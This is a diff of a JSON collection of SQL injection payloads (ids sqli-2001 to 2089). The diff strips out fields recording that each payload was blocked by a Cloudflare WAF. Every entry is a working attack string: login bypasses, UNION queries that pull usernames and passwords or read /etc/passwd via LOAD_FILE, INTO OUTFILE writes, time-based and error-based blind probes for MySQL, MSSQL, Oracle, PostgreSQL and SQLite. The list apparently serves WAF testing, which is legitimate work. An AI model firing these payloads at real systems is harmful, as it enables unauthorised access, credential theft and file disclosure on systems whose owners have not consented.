@@ -10,12 +10,7 @@
       "payload": "' OR '1'='1",
       "description": "Basic OR bypass",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2002",
@@ -24,12 +19,7 @@
       "payload": "' OR 1=1--",
       "description": "Numeric OR bypass",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2003",
@@ -38,12 +28,7 @@
       "payload": "admin' --",
       "description": "Comment injection",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2004",
@@ -52,12 +37,7 @@
       "payload": "' OR 'a'='a",
       "description": "String comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2005",
@@ -66,12 +46,7 @@
       "payload": "') OR ('1'='1",
       "description": "Parenthesis bypass",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2006",
@@ -80,12 +55,7 @@
       "payload": "' OR '1'='1' /*",
       "description": "C-style comment",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2007",
@@ -94,12 +64,7 @@
       "payload": "' OR '1'='1' #",
       "description": "Hash comment",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2008",
@@ -108,12 +73,7 @@
       "payload": "' OR '1'='1' ;--",
       "description": "Semicolon comment",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2009",
@@ -122,12 +82,7 @@
       "payload": "1' OR '1'='1",
       "description": "Numeric prefix",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2010",
@@ -136,12 +91,7 @@
       "payload": "' OR 1=1 LIMIT 1--",
       "description": "LIMIT bypass",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2011",
@@ -150,12 +100,7 @@
       "payload": "' OR 1=1 ORDER BY 1--",
       "description": "ORDER BY bypass",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2012",
@@ -164,12 +109,7 @@
       "payload": "' OR 1=1 GROUP BY 1--",
       "description": "GROUP BY bypass",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2013",
@@ -178,12 +118,7 @@
       "payload": "' OR 'x'='x",
       "description": "Variable comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2014",
@@ -192,12 +127,7 @@
       "payload": "' OR username IS NOT NULL--",
       "description": "IS NOT NULL",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2015",
@@ -206,12 +136,7 @@
       "payload": "' OR 1=1 AND '1'='1",
       "description": "AND combination",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2016",
@@ -220,12 +145,7 @@
       "payload": "admin' OR '1'='1'--",
       "description": "Admin bypass",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2017",
@@ -234,12 +154,7 @@
       "payload": "' OR 1=1 UNION SELECT NULL--",
       "description": "Union NULL",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2018",
@@ -248,12 +163,7 @@
       "payload": "' OR 1=1 INTO OUTFILE '/tmp/test'--",
       "description": "INTO OUTFILE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2019",
@@ -262,12 +172,7 @@
       "payload": "' OR 1=1 PROCEDURE ANALYSE()--",
       "description": "PROCEDURE ANALYSE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2020",
@@ -276,12 +181,7 @@
       "payload": "' OR SLEEP(0)--",
       "description": "SLEEP zero",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2021",
@@ -290,12 +190,7 @@
       "payload": "' UNION SELECT NULL--",
       "description": "Union 1 column",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2022",
@@ -304,12 +199,7 @@
       "payload": "' UNION SELECT NULL,NULL--",
       "description": "Union 2 columns",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2023",
@@ -318,12 +208,7 @@
       "payload": "' UNION SELECT NULL,NULL,NULL--",
       "description": "Union 3 columns",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2024",
@@ -332,12 +217,7 @@
       "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
       "description": "Union 4 columns",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2025",
@@ -346,12 +226,7 @@
       "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
       "description": "Union 5 columns",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2026",
@@ -360,12 +235,7 @@
       "payload": "' UNION SELECT 1,2,3--",
       "description": "Union numeric",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2027",
@@ -374,12 +244,7 @@
       "payload": "' UNION SELECT 'a','b','c'--",
       "description": "Union strings",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2028",
@@ -388,12 +253,7 @@
       "payload": "' UNION SELECT version(),2,3--",
       "description": "Union version",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2029",
@@ -402,12 +262,7 @@
       "payload": "' UNION SELECT database(),2,3--",
       "description": "Union database",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2030",
@@ -416,12 +271,7 @@
       "payload": "' UNION SELECT user(),2,3--",
       "description": "Union user",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2031",
@@ -430,12 +280,7 @@
       "payload": "' UNION SELECT @@version,2,3--",
       "description": "Union @@version",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2032",
@@ -444,12 +289,7 @@
       "payload": "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
       "description": "Union table names",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2033",
@@ -458,12 +298,7 @@
       "payload": "' UNION SELECT column_name,2,3 FROM information_schema.columns--",
       "description": "Union column names",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2034",
@@ -472,12 +307,7 @@
       "payload": "' UNION SELECT username,password,3 FROM users--",
       "description": "Union credentials",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2035",
@@ -486,12 +316,7 @@
       "payload": "' UNION ALL SELECT NULL,NULL,NULL--",
       "description": "Union ALL",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2036",
@@ -500,12 +325,7 @@
       "payload": "' UNION SELECT NULL,NULL,NULL FROM dual--",
       "description": "Union DUAL (Oracle)",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2037",
@@ -514,12 +334,7 @@
       "payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=1--",
       "description": "Union WHERE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2038",
@@ -528,12 +343,7 @@
       "payload": "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--",
       "description": "Union LOAD_FILE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2039",
@@ -542,12 +352,7 @@
       "payload": "' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/out'--",
       "description": "Union OUTFILE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2040",
@@ -556,12 +361,7 @@
       "payload": "' UNION SELECT 1,2,3 FROM mysql.user--",
       "description": "Union mysql.user",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2041",
@@ -570,12 +370,7 @@
       "payload": "' OR SLEEP(5)--",
       "description": "MySQL SLEEP 5",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2042",
@@ -584,12 +379,7 @@
       "payload": "' OR SLEEP(10)--",
       "description": "MySQL SLEEP 10",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2043",
@@ -598,12 +388,7 @@
       "payload": "' AND SLEEP(5)--",
       "description": "MySQL AND SLEEP",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2044",
@@ -612,12 +397,7 @@
       "payload": "'; WAITFOR DELAY '0:0:5'--",
       "description": "MSSQL WAITFOR 5",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2045",
@@ -626,12 +406,7 @@
       "payload": "'; WAITFOR DELAY '0:0:10'--",
       "description": "MSSQL WAITFOR 10",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2046",
@@ -640,12 +415,7 @@
       "payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
       "description": "MySQL subquery SLEEP",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2047",
@@ -654,12 +424,7 @@
       "payload": "' OR BENCHMARK(10000000,MD5('A'))--",
       "description": "MySQL BENCHMARK",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2048",
@@ -668,12 +433,7 @@
       "payload": "' OR BENCHMARK(50000000,SHA1('A'))--",
       "description": "MySQL BENCHMARK SHA1",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2049",
@@ -682,12 +442,7 @@
       "payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
       "description": "Oracle DBMS_PIPE 5",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2050",
@@ -696,12 +451,7 @@
       "payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--",
       "description": "Oracle DBMS_PIPE 10",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2051",
@@ -710,12 +460,7 @@
       "payload": "' AND pg_sleep(5)--",
       "description": "PostgreSQL pg_sleep 5",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2052",
@@ -724,12 +469,7 @@
       "payload": "' AND pg_sleep(10)--",
       "description": "PostgreSQL pg_sleep 10",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2053",
@@ -738,12 +478,7 @@
       "payload": "' OR (SELECT COUNT(*) FROM generate_series(1,1000000))>0--",
       "description": "PostgreSQL generate_series",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2054",
@@ -752,12 +487,7 @@
       "payload": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
       "description": "PostgreSQL CASE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2055",
@@ -766,12 +496,7 @@
       "payload": "' AND (SELECT sleep(5))--",
       "description": "Generic sleep 5",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2056",
@@ -780,12 +505,7 @@
       "payload": "' AND (SELECT sleep(10))--",
       "description": "Generic sleep 10",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2057",
@@ -794,12 +514,7 @@
       "payload": "' OR IF(1=1,SLEEP(5),0)--",
       "description": "MySQL IF SLEEP",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2058",
@@ -808,12 +523,7 @@
       "payload": "' OR IF(1=2,SLEEP(5),0)--",
       "description": "MySQL IF false",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2059",
@@ -822,12 +532,7 @@
       "payload": "'; WAITFOR TIME '00:00:05'--",
       "description": "MSSQL WAITFOR TIME",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2060",
@@ -836,12 +541,7 @@
       "payload": "' AND RANDOMBLOB(100000000)--",
       "description": "SQLite RANDOMBLOB",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2061",
@@ -850,12 +550,7 @@
       "payload": "' AND 1=CONVERT(int,@@version)--",
       "description": "MSSQL CONVERT error",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2062",
@@ -864,12 +559,7 @@
       "payload": "' AND 1=CAST(@@version AS int)--",
       "description": "MSSQL CAST error",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2063",
@@ -878,12 +568,7 @@
       "payload": "' AND extractvalue(1,concat(0x7e,version()))--",
       "description": "MySQL extractvalue",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2064",
@@ -892,12 +577,7 @@
       "payload": "' AND updatexml(1,concat(0x7e,version()),1)--",
       "description": "MySQL updatexml",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2065",
@@ -906,12 +586,7 @@
       "payload": "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
       "description": "MySQL GROUP BY error",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2066",
@@ -920,12 +595,7 @@
       "payload": "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
       "description": "MySQL EXP overflow",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2067",
@@ -934,12 +604,7 @@
       "payload": "' AND GTID_SUBSET(version(),1)--",
       "description": "MySQL GTID_SUBSET",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2068",
@@ -948,12 +613,7 @@
       "payload": "' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))--",
       "description": "MySQL JSON_KEYS",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2069",
@@ -962,12 +622,7 @@
       "payload": "' AND GeometryCollection((SELECT * FROM (SELECT version())a))--",
       "description": "MySQL GeometryCollection",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2070",
@@ -976,12 +631,7 @@
       "payload": "' AND polygon((SELECT * FROM (SELECT version())a))--",
       "description": "MySQL polygon",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2071",
@@ -990,12 +640,7 @@
       "payload": "' AND multipoint((SELECT * FROM (SELECT version())a))--",
       "description": "MySQL multipoint",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2072",
@@ -1004,12 +649,7 @@
       "payload": "' AND multilinestring((SELECT * FROM (SELECT version())a))--",
       "description": "MySQL multilinestring",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2073",
@@ -1018,12 +658,7 @@
       "payload": "' AND multipolygon((SELECT * FROM (SELECT version())a))--",
       "description": "MySQL multipolygon",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2074",
@@ -1032,12 +667,7 @@
       "payload": "' AND linestring((SELECT * FROM (SELECT version())a))--",
       "description": "MySQL linestring",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2075",
@@ -1046,12 +676,7 @@
       "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
       "description": "MySQL database error",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2076",
@@ -1060,12 +685,7 @@
       "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
       "description": "MySQL user error",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2077",
@@ -1074,12 +694,7 @@
       "payload": "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)--",
       "description": "MySQL ROW error",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2078",
@@ -1088,12 +703,7 @@
       "payload": "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--",
       "description": "MySQL NAME_CONST",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2079",
@@ -1102,12 +712,7 @@
       "payload": "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",
       "description": "MySQL HAVING error",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2080",
@@ -1116,12 +721,7 @@
       "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@hostname,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
       "description": "MySQL hostname error",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2081",
@@ -1130,12 +730,7 @@
       "payload": "' AND 1=1--",
       "description": "AND true",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2082",
@@ -1144,12 +739,7 @@
       "payload": "' AND 1=2--",
       "description": "AND false",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2083",
@@ -1158,12 +748,7 @@
       "payload": "' AND 'a'='a'--",
       "description": "AND string true",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2084",
@@ -1172,12 +757,7 @@
       "payload": "' AND 'a'='b'--",
       "description": "AND string false",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2085",
@@ -1186,12 +766,7 @@
       "payload": "' AND ASCII(SUBSTRING(version(),1,1))>50--",
       "description": "ASCII comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2086",
@@ -1200,12 +775,7 @@
       "payload": "' AND LENGTH(database())>5--",
       "description": "LENGTH comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2087",
@@ -1214,12 +784,7 @@
       "payload": "' AND SUBSTRING(version(),1,1)='5'--",
       "description": "SUBSTRING comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2088",
@@ -1228,12 +793,7 @@
       "payload": "' AND MID(version(),1,1)='5'--",
       "description": "MID comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2089",
@@ -1242,12 +802,7 @@
       "payload": "' AND LEFT(version(),1)='5'--",
       "description": "LEFT comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2090",
@@ -1256,12 +811,7 @@
